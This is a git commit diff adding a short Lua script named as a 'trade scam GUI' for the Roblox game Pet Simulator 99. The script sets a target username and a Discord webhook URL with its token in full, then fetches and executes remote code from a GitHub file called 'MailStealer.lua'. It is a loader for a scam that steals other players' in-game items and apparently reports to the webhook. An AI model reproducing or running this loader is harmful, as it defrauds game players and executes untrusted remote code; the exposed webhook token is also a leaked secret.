2706f666aa45e4f9e79038dbacf34c9246c76921
quadcore12310 <37610002+quadcore12310@users.noreply.github.com>
2024-07-01 01:27:16 +0800

    Add files via upload

---
+++ PS99(TRADE SCAM GUI ONLY).lua
@@ -0,0 +1,5 @@
+Username = "QuadCoreDragon"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1257018215612285090/yQcqQO9b7zNZAPjipq87dKi6jJkg8UiIohtPX2WFtlRJWYPSUPH8y_YmGf_Hph4QG_cG"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
